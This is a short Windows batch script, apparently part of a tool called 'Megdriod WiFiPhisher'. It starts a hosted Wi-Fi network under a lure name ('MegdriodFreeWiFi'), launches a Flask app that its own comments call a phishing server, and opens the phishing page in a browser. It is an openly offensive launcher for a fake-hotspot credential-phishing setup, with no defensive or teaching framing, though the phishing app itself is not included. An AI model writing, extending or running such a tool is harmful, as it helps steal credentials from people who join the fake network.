@echo off
title Megdriod WiFiPhisher - Start Fake WiFi Hotspot
echo Starting Wi-Fi hotspot...

REM Replace "MegdriodFreeWiFi" and "password123" with your SSID and password
netsh wlan set hostednetwork mode=allow ssid=MegdriodFreeWiFi key=password123
netsh wlan start hostednetwork

echo Launching Flask phishing server...
REM Activate virtualenv if needed (uncomment if you're using one)
REM call venv\Scripts\activate

REM Run your app (assumes Python is in PATH)
start cmd /k python app.py

timeout /t 5

echo Opening phishing page in browser...
start http://192.168.0.152

echo Done.
pause
